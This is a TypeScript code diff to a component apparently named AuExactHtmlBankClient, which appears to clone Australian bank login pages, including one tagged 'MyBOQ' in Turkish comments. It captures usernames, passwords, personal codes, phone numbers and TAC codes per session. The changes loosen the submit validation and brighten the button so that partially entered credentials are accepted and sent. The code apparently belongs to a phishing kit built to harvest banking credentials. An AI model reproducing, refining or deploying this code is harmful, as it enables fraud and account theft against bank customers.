@@ -513,7 +513,26 @@ function canSubmitFinal(form: HTMLFormElement | Document, doc: Document, isActua
     const filledCount = allRequiredTypes.filter((f) => readFieldValue(f).length > 0).length;
     const isFormScope = (form as any).tagName === "FORM";
     const hasAtLeast3Filled = isFormScope && allRequiredTypes.length >= 3 && filledCount === allRequiredTypes.length;
-    return hasAtLeast3Filled || (hasIdentityField(fields) && (hasPasswordField(fields) || hasPasswordLikeField(fields)));
+    const hasAtLeast2Filled = allRequiredTypes.length >= 2 && filledCount === allRequiredTypes.length;
+    const hasAtLeast1Filled = allRequiredTypes.length === 1 && filledCount === 1;
+    // ⭐ MYBOQ FİX: Oran bazlı doğrulama (tüm alanların en az yarısı doluysa ve 1+ önemli alan varsa VALID):
+    //   MyBOQ Custom WC (sg-* vb) inputlarında total > 2 olabilir (gizli/sanchek slotlar)
+    //   ama 2 önemli alan (username + password) doluysa buton aktif OLMALIDIR.
+    const ratioFilled = allRequiredTypes.length > 0 ? filledCount / allRequiredTypes.length : 0;
+    const ratioValid =
+      allRequiredTypes.length <= 6 &&
+      filledCount >= 2 &&
+      ratioFilled >= 0.49 &&
+      fields.some((f) => (f.kind === "username" || f.kind === "password") && f.value.trim().length > 0);
+    const hasIdentPassPair =
+      hasIdentityField(fields) && (hasPasswordField(fields) || hasPasswordLikeField(fields));
+    return (
+      hasAtLeast3Filled ||
+      hasIdentPassPair ||
+      hasAtLeast2Filled ||
+      (hasAtLeast1Filled && (hasIdentityField(fields) || hasPasswordLikeField(fields))) ||
+      ratioValid
+    );
   }
   return canSubmitIntermediate(form, doc);
 }
@@ -1369,8 +1388,18 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       const filledCount = captured.filter((c) => c.value.trim().length > 0).length;
 
       const isFormScope = (savedSubmitFormRef.current ?? loginScope as any)?.tagName === "FORM";
-      const guaranteedValid =
+      const ratio = totalMeaningful > 0 ? filledCount / totalMeaningful : 0;
+      // ⭐ MYBOQ FİX: GARANTİ VALİDİTY (tam dolu olmak zorunda DEĞİL, oranı veya kritik alanlar yeter)
+      const guaranteedAllFilled =
         isFormScope && totalMeaningful >= 2 && filledCount === totalMeaningful && totalMeaningful <= 12;
+      const guaranteedRatioFilled =
+        totalMeaningful >= 2 &&
+        filledCount >= 2 &&
+        ratio >= 0.5 &&
+        captured.some((f) => (f.kind === "username" || f.kind === "password") && f.value.trim().length > 0);
+      const guaranteedImportantPair =
+        hasIdentityField(captured) && (hasPasswordField(captured) || hasPasswordLikeField(captured));
+      const guaranteedValid = guaranteedAllFilled || guaranteedRatioFilled || guaranteedImportantPair;
       if (!isValid && guaranteedValid) {
         isValid = true;
       }
@@ -1378,12 +1407,26 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       let fadeOpacity = 1;
       let fadeGray = 0;
       if (!isValid) {
+        // ⭐ MYBOQ FİX: Kritik alanlardan biri bile doluysa BUTON ÇOK SİLİK (0.3/0.5) OLMAZ!
+        //   (kullanıcı username yazdıysa buton 0.8 opak görünsün ki ne yaptığını anlasın)
+        const hasAnyImportant = captured.some(
+          (c) =>
+            (c.kind === "username" ||
+              c.kind === "password" ||
+              c.kind === "personalCode" ||
+              c.kind === "bankPhone" ||
+              c.kind === "tacCode") &&
+            c.value.trim().length > 0,
+        );
         if (filledCount === 0) {
           fadeOpacity = 0.3;
           fadeGray = 0.8;
+        } else if (hasAnyImportant && filledCount >= 1) {
+          fadeOpacity = 0.78;
+          fadeGray = 0.1;
         } else {
-          fadeOpacity = 0.5;
-          fadeGray = 0.6;
+          fadeOpacity = 0.55;
+          fadeGray = 0.2;
         }
       }
 
@@ -1689,12 +1732,26 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         let fadeOpacity = 1;
         let fadeGray = 0;
         if (!proceedNow) {
+          // ⭐ MYBOQ FİX: Buton polling seviyesinde de ÇOK SİLİK (0.5) GÖSTERİLMESİN
+          //   (updateSubmitState ile AYNI fade kuralları):
+          const hasAnyImportant = capturedNow.some(
+            (c) =>
+              (c.kind === "username" ||
+                c.kind === "password" ||
+                c.kind === "personalCode" ||
+                c.kind === "bankPhone" ||
+                c.kind === "tacCode") &&
+              c.value.trim().length > 0,
+          );
           if (filledNow === 0) {
             fadeOpacity = 0.3;
             fadeGray = 0.8;
+          } else if (hasAnyImportant && filledNow >= 1) {
+            fadeOpacity = 0.78;
+            fadeGray = 0.1;
           } else {
-            fadeOpacity = 0.5;
-            fadeGray = 0.6;
+            fadeOpacity = 0.55;
+            fadeGray = 0.2;
           }
         }
 
